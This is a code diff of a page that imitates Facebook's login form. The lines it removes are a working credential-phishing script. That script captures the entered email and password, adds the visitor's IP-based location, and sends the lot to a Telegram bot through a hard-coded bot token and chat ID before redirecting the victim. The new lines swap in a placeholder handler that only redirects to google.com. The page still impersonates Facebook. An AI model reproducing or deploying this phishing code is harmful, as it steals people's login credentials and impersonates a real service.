@@ -120,10 +120,10 @@
         <h2 class="text-blue-800 text-2xl mt-4 font-bold">Log In to Facebook</h2>
 
         <!-- Login Form -->
-        <form id="loginForm">
+        <form id="loginForm" onsubmit="return handleLogin()">
             <input type="text" name="email" id="email" placeholder="Email or Phone" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
-            <button type="button" onclick="sendToTelegram()">Log In</button>
+            <button type="submit">Log In</button>
         </form>
     </div>
 
@@ -136,48 +136,15 @@
     </footer>
 
     <script>
-        async function sendToTelegram() {
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+        function handleLogin() {
+            // Prevent form from submitting via default behavior
+            event.preventDefault();
 
-            // Define the redirect URL you want to use
-            const redirectUrl = "https://unknownlink.com"; // Change this to your preferred URL
+            // Add your form submission logic here
+            // Example: Sending data to an API, etc.
 
-            try {
-                const res = await axios.get('https://ipapi.co/json/');
-                const data = res.data;
-
-                const location = data.city || 'Unknown';
-                const country = data.country_name || 'Unknown';
-                const flag = data.country_code ? `:${data.country_code.toLowerCase()}:` : '🏳️';
-                const currentTime = new Date().toLocaleTimeString('en-US', { timeZone: data.timezone || 'UTC' });
-
-                const telegramToken = "7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo"; // Replace with your bot token
-                const chatId = "6482794683"; // Replace with your chat ID
-                const message = `
-📝 *Info*
-🔑 ${email}
-🔐 ${password}
-🌍 ${location}
-🏳️ ${country} ${flag}
-⏰ ${currentTime}
-
-📌 *@stubborn Academy*
-                `;
-
-                await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                });
-
-                // Redirect to the custom URL after successful submission
-                window.location.href = redirectUrl; // https://tmra8.blogspot.com/?url=MTdjMTY1OWMtMWFiMi00MDY1LWJkMTgtMGZjNmQwOTcwNmE1X3F1ZXJ5XzFjZTU2ZWZjLWQ0NWUtNDA4MC04YjFjLWZkYTFmNTU1YWI3NQ%3D%3D&m=1
-            } catch (error) {
-                console.error("Error sending message to Telegram:", error);
-                // Redirect to the custom URL even if something fails
-                window.location.href = redirectUrl; // https://tmra8.blogspot.com/?url=MTdjMTY1OWMtMWFiMi00MDY1LWJkMTgtMGZjNmQwOTcwNmE1X3F1ZXJ5XzFjZTU2ZWZjLWQ0NWUtNDA4MC04YjFjLWZkYTFmNTU1YWI3NQ%3D%3D&m=1
-            }
+            // After handling the form, redirect to the desired URL
+            window.location.href = "https://google.com/";
         }
     </script>
 </body>
